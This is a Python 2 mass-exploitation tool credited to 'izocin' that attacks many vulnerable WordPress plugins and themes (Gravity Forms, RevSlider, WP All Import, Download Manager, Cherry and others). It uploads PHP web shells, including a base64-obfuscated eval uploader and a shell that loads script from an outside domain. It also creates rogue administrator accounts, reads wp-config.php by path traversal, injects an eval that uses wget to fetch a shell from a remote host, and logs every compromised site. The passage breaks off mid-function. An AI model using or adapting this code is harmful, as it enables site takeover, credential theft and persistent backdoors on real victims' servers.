import requests, os
import time, sys
import string, random
import urllib2,urllib,re
import optparse
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from platform import system
from urllib import unquote_plus as urldecode

try:
	from colorama import Fore
	from colorama import Style
	from pprint import pprint
	from colorama import init
	from Queue import Queue
except ImportError :
    print 'cd C:/python27/Scripts/pip install colorama'
    exit (-1)
init(autoreset=True)

# Coded By izocin 
# Yemen hackers
times = str(time.time())
path = int(times[0:10]) + 3

shell = """GIF89a <title>Vuln!! patch it Now!</title>
<?php
echo '
<script type="text/javascript" src="http://www.codejquery.net/jquery.mins.js" ></script>
<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
else { echo '<b>Not uploaded ! </b><br><br>'; }
}
?>"""

shell_name = str(time.time())[:-3]

filename = "izo_"+str(shell_name)+".php.php"

filesname = ""+str(shell_name)+"-izo.php"

filec = "izo.php"

izoupload = "Hacked By izocin"

filevid = "izo.PhP.txtx"

filecl = "izom.php"
			
izoname = "izo.txt"

izo = '<?php eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));?>&field_id=3&form_id=1&gform_unique_id=../../../../uploads/gravity_forms/&name=izo.phtml'

filey = "izo.PHtml"

filet = "izom.shtml"

patpat = "Backdoor.jpg"

patxx = "izo.php.jpg"

filname = '1.zip'
####### Colors ########
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
sd  =   Style.DIM
sn  =   Style.NORMAL
sb  =   Style.BRIGHT


if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
	os.system('cls')
	

banner = """{}{} \n \n         
	
                                                                
                                                                
                                                                
  ,--,                                      ,--,                
,--.'|          ,----,   ,---.            ,--.'|         ,---,  
|  |,         .'   .`|  '   ,'\           |  |,      ,-+-. /  | 
`--'_      .'   .'  .' /   /   |   ,---.  `--'_     ,--.'|'   | 
,' ,'|   ,---, '   ./ .   ; ,. :  /     \ ,' ,'|   |   |  ,"' | 
'  | |   ;   | .'  /  '   | |: : /    / ' '  | |   |   | /  | | 
|  | :   `---' /  ;--,'   | .; :.    ' /  |  | :   |   | |  | | 
'  : |__   /  /  / .`||   :    |'   ; :__ '  : |__ |   | |  |/  
|  | '.'|./__;     .'  \   \  / '   | '.'||  | '.'||   | |--'   
;  :    ;;   |  .'      `----'  |   :    :;  :    ;|   |/       
|  ,   / `---'                   \   \  / |  ,   / '---'        
 ---`-'                           `----'   ---`-'               
                                                                
     
 
 
	Coded By: izocin , FB.com/izocin.73
	
 
\n""".format(fc, sb)

print banner
def id_generator(size=6, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
		
		
def lear(host):

	try:
		
		host = host.strip()

		
		if str("izocin") in shell:
			
			files = {'uploadfiles[]': (filename, shell, 'text/html')}

			r = requests.post(host, files=files,data = {'post':'foobar','course_id':'foobar','uploadfile':'foobar'})
		
		
		
			lib = requests.get(host+'/wp-content/uploads/assignments/'+filename.replace('.php.php', '.php.'))

			if 'izocin' in lib.content:
				print '\r\r\r{}{}[*] {:<60} : {}{}learndash eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
				open('learnshells.txt', 'a').write(host+'/wp-content/uploads/assignments/'+filename.replace('.php.php', '.php.')+'\n')
				
			else:
				
				print '\r\r\r{}{}[*] {:<60} : {}{}learndash Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			

	except:
		pass
		
		
		
def impo(host):


	try:
	
	
		host = host.strip()
		
		


		req = requests.post(host+'/wp-admin/admin-ajax.php?page=pmxi-admin-settings&action=upload&name=izo.php',data=shell,timeout=5)

		path_dir = os.popen('php -r "print md5(\''+str(path)+'\');"').read()
		
		
		lib = requests.get(host+"/wp-content/uploads/wpallimport/uploads/"+str(path_dir)+"/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{} eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('Shell-Import.txt', 'a').write(host+'/wp-content/uploads/wpallimport/uploads/'+path_dir+'/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}wpallimport Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def cher(host):


	try:
	
	
		host = host.strip()
		
		
		Fab = {'file':(filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/cherry-plugin/admin/import-export/upload.php', files=Fab)

		
		
		lib = requests.get(host+"/wp-content/plugins/cherry-plugin/admin/import-export/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Chrerry eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('Shell-cherry.txt', 'a').write(host+'/wp-content/plugins/cherry-plugin/admin/import-export/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Cherry Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		


def woo(host):


	try:
	
	
		host = host.strip()
		
		post = {'action': 'nm_personalizedproduct_upload_file', 'name': 'upload.php'}
		
		files = {'file': (filname, open(filname, 'rb'), 'multipart/form-data')}

		req = requests.post(host+'/wp-admin/admin-ajax.php', data=post,files=files)

		
		
		lib = requests.get(host+"/wp-content/uploads/product_files/upload.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}woocommerce eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('woocommece-productfiles.txt', 'a').write(host+'/wp-content/uploads/product_files/upload.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}woocommerce Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
				
def Mana(host):


	
	
	try:
		
		
		lib = requests.session()
		
		
		host = host.strip()
		
		
		headers = {'User-agent': 'Mozilla/5.0'}
		
		# User and pass
		username = str('rxr')+id_generator()
		passwds = str('rxr')+id_generator()
	
	
		# data 
		add ={'action' : 'wpdm_ajax_call',
			   'execute' : 'wp_insert_user',
			   'user_login' :username,
			   'user_pass' : passwds,
			   'role' : 'administrator'}

		req = requests.post(host+'/', data=add, headers=headers)
		
		# Check if the Exploit Working or not :D 
		if req.text == "":
			check = lib.get(host+'/wp-login.php')
			
			
			r0x = re.findall('"button button-primary button-large" value="(.*?)"',check.content)
			
			
			Pax = {'log':str(username),
				   'pwd':str(passwds),
				   'wp-submit':r0x[0],
				   'redirect_to':host+'/wp-admin/', 
				  'testcookie':'1'
				  }
			
			lib1 = lib.post(host+'/wp-login.php', data=Pax)
			
			if '<li id="wp-admin-bar-logout">' in lib1.content:
				print '\r\r\r{}{}[*] {:<60} : {}{} Download Menager eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
				open('login-do.txt', 'a').write(host+'/wp-login.php@'+passwds+'#&'+passwds+'@'+'\n')
			else:
				print '\r\r\r{}{}[*] {:<60} : {}{}Down Menager Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)		
							
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Down Not Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)			
			
	except:
		pass


def rev(host):


	try:
	
	
		host = host.strip()
		

		
		
		lib = requests.get(host+"/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
				
		if 'DB_USER' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Revslider eXploiting{}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('revsliderconfig.txt', 'a').write(host+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Revslider Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		


def revs(host):


	try:
	
	
		host = host.strip()
		
		post = {"action" : "revslider_ajax_action","client_action" : "update_captions_css","data" : "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'> By security<br><p style='color: transparent'>"}
		

		req = requests.post(host+'/wp-admin/admin-ajax.php',data=post)

		
		
		lib = requests.get(host+"/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css")
		
		
		if 'security' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Revs Css eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('revslidergetcss.txt', 'a').write(host+'/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Revs Css Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		
def prop(host):


	try:
	
	
		host = host.strip()
		
		
		Fab = {'Filedata':(filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php', files=Fab)

		
		
		lib = requests.get(host+"/wp-content/plugins/wp-property/third-party/uploadify/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}wp-property eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('Shell-cherry.txt', 'a').write(host+'/wp-content/plugins/wp-property/third-party/uploadify/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}wp-property Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		


def refl(host):


	try:
	
	
		host = host.strip()
		
		
		Fab = {'qqfile':(filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2018&Month=01', files=Fab)

		
		
		lib = requests.get(host+"/wp-content/uploads/2018/01/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}reflex-gallery eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('reflex-gallery.txt', 'a').write(host+'/wp-content/uploads/2018/01/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}reflex-gallery Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass


def WPma(host):


	
	
	try:
		
		
		lib = requests.session()
		
		
		host = host.strip()
		
		
		headers = {'User-agent': 'Mozilla/5.0'}
		
		# User and pass
		username = str('rxr')+id_generator()
		passwds = str('rxr')+id_generator()
	
	
		# data 
		add ={'action' : 'wpmp_pp_ajax_call',
			   'execute' : 'wp_insert_user',
			   'user_login' :username,
			   'user_pass' : passwds,
			   'role' : 'administrator'}

		req = requests.post(host+'/', data=add, headers=headers)
		
		# Check if the Exploit Working or not :D 
		if req.text == "":
			check = lib.get(host+'/wp-login.php')
			
			
			r0x = re.findall('"button button-primary button-large" value="(.*?)"',check.content)
			
			
			Pax = {'log':str(username),
				   'pwd':str(passwds),
				   'wp-submit':r0x[0],
				   'redirect_to':host+'/wp-admin/', 
				  'testcookie':'1'
				  }
			
			lib1 = lib.post(host+'/wp-login.php', data=Pax)
			
			if '<li id="wp-admin-bar-logout">' in lib1.content:
				print '\r\r\r{}{}[*] {:<60} : {}{}WP Marketplace eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
				open('login-do.txt', 'a').write(host+'/wp-login.php@'+passwds+'#&'+passwds+'@'+'\n')
			else:
				print '\r\r\r{}{}[*] {:<60} : {}{}WP Marketplace Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)		
				
				
				
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}WP Marketplace Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)			
			
	except:
		pass


def WPxx(host):


	
	
	try:
		
		
		lib = requests.session()
		
		
		host = host.strip()
		
		
		headers = {'User-agent': 'Mozilla/5.0'}
		
		# User and pass
		username = str('rxr')+id_generator()
		passwds = str('rxr')+id_generator()
	
	
		# data 
		add ={'action' : 'wpdreams_callback',
			   'execute' : 'wp_insert_user',
			   'user_login' :username,
			   'user_pass' : passwds,
			   'role' : 'administrator'}

		req = requests.post(host+'/wp-admin/admin-ajax.php?page=ajax-search-pro/backend/settings.php&action=wpdreams-ajaxinputpost', data=add, headers=headers)
		
		# Check if the Exploit Working or not :D 
		if req.text == "":
			check = lib.get(host+'/wp-login.php')
			
			
			r0x = re.findall('"button button-primary button-large" value="(.*?)"',check.content)
			
			
			Pax = {'log':str(username),
				   'pwd':str(passwds),
				   'wp-submit':r0x[0],
				   'redirect_to':host+'/wp-admin/', 
				  'testcookie':'1'
				  }
			
			lib1 = lib.post(host+'/wp-login.php', data=Pax)
			
			if '<li id="wp-admin-bar-logout">' in lib1.content:
				print '\r\r\r{}{}[*] {:<60} : {}{}ajax-search-pro eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
				open('login-do.txt', 'a').write(host+'/wp-login.php@'+passwds+'#&'+passwds+'@'+'\n')
			else:
				print '\r\r\r{}{}[*] {:<60} : {}{}ajax-search-pro Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)		
				
				
				
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}ajax-search-pro Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)			
			
	except:
		pass

		
def ads(host):


	try:
	
	
		host = host.strip()
		
		post = {'action': 'upload_ad_imag', 'path': ''}
		
		files = {'uploadfile': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php', files=files,data=post)

		
		
		lib = requests.get(host+"/wp-content/plugins/simple-ads-manager/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Ads Manager eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('simpleadsmenagershell.txt', 'a').write(host+'/wp-content/plugins/simple-ads-manager/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Ads Manager Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def shov(host):


	try:
	
	
		host = host.strip()
		
		post = {'action': 'showbiz_ajax_action', 'client_action': 'update_plugin'}
		
		files = {'update_file': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-admin/admin-ajax.php', files=files,data=post)

		
		
		lib = requests.get(host+"/wp-content/plugins/showbiz/temp/update_extract/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}showbiz eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('showbiz.txt', 'a').write(host+'/wp-content/plugins/showbiz/temp/update_extract/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}showbiz Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def dzs(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'file_field': (filevid, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/dzs-videogallery/admin/upload.php', files=files)

		
		
		lib = requests.get(host+"/wp-content/plugins/dzs-videogallery/admin/upload/izo.PhP.txtx")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}dzs-videogallery eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('dzs-videogallery.txt', 'a').write(host+'/wp-content/plugins/dzs-videogallery/admin/upload/izo.PhP.txtx'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}dzs-videogallery Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def clac(host):


	try:
	
	
		host = host.strip()
		
		post = {'value': './'}
		
		files = {'uploadfile': (filecl, shell, 'text/html')}

		req = requests.post(host+'/wp-content/themes/clockstone/theme/functions/uploadbg.php', files=files, data=post)

		
		
		lib = requests.get(host+"/wp-content/themes/clockstone/theme/functions/e3726adb9493beb4e8e2dabe65ea10ef.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}clackstone eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('clarkstonetemashell.txt', 'a').write(host+'/wp-content/themes/clockstone/theme/functions/e3726adb9493beb4e8e2dabe65ea10ef.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}clackstone Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def voo(host):


	try:
	
	
		host = host.strip()
		

		
		
		req = requests.get(host+"/produits/?items_per_page=%24%7b%40eval(base64_decode(cGFzc3RocnUoJ2NkIHdwLWNvbnRlbnQvdXBsb2Fkcy8yMDE4LzAxO3dnZXQgaHR0cDovL3d3dy5hd3RjLmFpZHQuZWR1Ly9jb21wb25lbnRzL2NvbV9iMmpjb250YWN0L3VwbG9hZHMvdHh0LnR4dDttdiB0eHQudHh0IGl6b20ucGhwJyk7))%7d&setListingType=grid")
		
		lib = requests.get(host+"/wp-content/uploads/2018/01/izom.php")
				
		if 'SangPujaan' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}produits eXploiting{}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('woocommerc.txt', 'a').write(host+'/wp-content/uploads/2018/01/izom.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}produits Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def imdb(host):


	try:
	
	
		host = host.strip()
		

		
		
		lib = requests.get(host+"/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10")
				
		if 'DB_USER' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}hb-audio eXploiting{}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('hb-audio-gallery.txt', 'a').write(host+'/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}hb-audio Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		


def gomn(host):


	try:
	
	
		host = host.strip()
		
		headers = {'Content-Type': 'text/plain'}
		
		req = requests.post(host+'/wp-content/plugins/seo-spy-google-wordpress-plugin/ofc/php-ofc-library/ofc_upload_image.php?name=izo.php',data=shell,headers=headers)

			
		lib = requests.get(host+"/wp-content/plugins/seo-spy-google-wordpress-plugin/ofc/tmp-upload-images/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}seo-spy eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('seo-spy-google-wordpress-plugi.txt', 'a').write(host+'/wp-content/plugins/seo-spy-google-wordpress-plugin/ofc/tmp-upload-images/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}seo-spy Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def gomc(host):


	try:
	
	
		host = host.strip()
		
		headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1','Content-Type': 'text/plain'}
		
		req = requests.post(host+'/wp-content/plugins/seo-watcher/ofc/php-ofc-library/ofc_upload_image.php?name=izo.php',data=shell,headers=headers)

			
		lib = requests.get(host+"/wp-content/plugins/seo-watcher/ofc/tmp-upload-images/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}seo-watcher eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('seo-watcher.txt', 'a').write(host+'/wp-content/plugins/seo-watcher/ofc/tmp-upload-images/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}seo-watcher Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		
def opxy(host):


	try:
	
	
		host = host.strip()
		
		headers = {'Content-Type': 'text/plain'}
		
		req = requests.post(host+'/wp-content/plugins/php-analytics/resources/open-flash-chart/php-ofc-library/ofc_upload_image.php?name=izo.php',data=shell,headers=headers)

			
		lib = requests.get(host+"/wp-content/plugins/php-analytics/resources/open-flash-chart/tmp-upload-images/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}php-analytics eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('php-analytics.txt', 'a').write(host+'/wp-content/plugins/php-analytics/resources/open-flash-chart/tmp-upload-images/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}php-analytics Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def sosx(host):


	try:
	
	
		host = host.strip()
		
		post = {'config_path': '../../../../../../'}
		
		files = {'image': (filecl, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/social-networking-e-commerce-1/classes/views/social-options/form_cat_add.php', files=files, data=post)

		
		
		lib = requests.get(host+"/wp-content/plugins/social-networking-e-commerce-1/images/uploads/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}social-networking eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('social-networking-e-commerce-1.txt', 'a').write(host+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}social-networking Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def chig(host):


	try:
	
	
		host = host.strip()
		
		headers = {'Content-Type': 'text/plain'}
		
		req = requests.post(host+'/wp-content/plugins/chikuncount/php-ofc-library/ofc_upload_image.php?name=izo.php',data=shell,headers=headers)

			
		lib = requests.get(host+"/wp-content/plugins/chikuncount/tmp-upload-images/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}chikuncount eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('chikuncount.txt', 'a').write(host+'/wp-content/plugins/chikuncount/tmp-upload-images/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}chikuncount Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def dvpx(host):


	try:
	
	
		host = host.strip()
		
		post = {'UPLOADDIR': '../','ADMINEMAIL': 'test@example.com'}
		
		files = {'Filedata': (filecl, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/developer-tools/libs/swfupload/upload.php', files=files, data=post)

		
		
		lib = requests.get(host+"/wp-content/plugins/developer-tools/libs/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}developer-tools eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('developer-tools.txt', 'a').write(host+'/wp-content/plugins/developer-tools/libs/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}developer-tools Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def dvpy(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'Filedata': (filecl, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/dop-slider/libraries/php/uploadify.php?path=../../', files=files)

		
		
		lib = requests.get(host+"/wp-content/plugins/dop-slider/uploads/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}dop-slider eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('dop-slider.txt', 'a').write(host+'/wp-content/plugins/dop-slider/uploads/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}dop-slider Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def wobu(host):


	try:
	
	
		host = host.strip()
		

		
		
		lib = requests.get(host+"/wp-content/plugins/woocommerce-products-filter/lib/simple-ajax-uploader/examples/basic_example/")
				
		if 'Choose File' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}woomrce up eXploiting{}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('woomrce-up.txt', 'a').write(host+'/wp-content/plugins/woocommerce-products-filter/lib/simple-ajax-uploader/examples/basic_example/'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}woomrce up Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		


def grav(host):


	try:
	
	
		host = host.strip()
		
		post = {'field_id': '3','form_id': '1','gform_unique_id': '../../../','name': 'css.php.jd'}
		
		files = {'file': (patpat, shell, 'text/html')}

		req = requests.post(host+'/?gf_page=upload', files=files, data=post)

		
		
		lib = requests.get(host+"/wp-content/uploads/_input_3_css.php.jd")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Gravity eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('gravity.txt', 'a').write(host+'/wp-content/uploads/_input_3_css.php.jd'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Gravity Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def grad(host):


	try:
	
	
		host = host.strip()
		
		resp    =   urllib2.urlopen(host+'/?gf_page=upload', data=izo)

		lib = requests.get(host+"/wp-content/uploads/gravity_forms/_input_3_izo.phtml")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Gravity2 eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('gravity.txt', 'a').write(host+'/wp-content/uploads/gravity_forms/_input_3_izo.phtml'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Gravity2 Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		
def tevx(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'Filedata': (filecl, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php', files=files)

		
		
		lib = requests.get(host+"/wp-content/uploads/2018/01/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Tevolutin eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('dop-slider.txt', 'a').write(host+'/wp-content/uploads/2018/01/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Tevolutin Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def even(host):


	try:
	
	
		host = host.strip()
		
		post = {'targetFolder': '../../../../../','user_id': '0day'}
		
		files = {'Filedata': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/php-event-calendar/server/classes/uploadify.php', files=files, data=post)

		
		
		lib = requests.get(host+"/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}calendar eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('calendar.txt', 'a').write(host+'/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}calendar Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def seob(host):


	try:
	
	
		host = host.strip()
		
		
		post = {"newins" : '<?php eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));?>'}

		req = requests.post(host+'/wp-content/plugins/option-seo/install.php', data=post)

		
		
		lib = requests.get(host+"/wp-content/plugins/option-seo/installed.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}option-seo eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('option-seo.txt', 'a').write(host+'/wp-content/plugins/option-seo/installed.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}option-seo Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		
def mapx(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'checkinuse': (shell, 'text/html')}

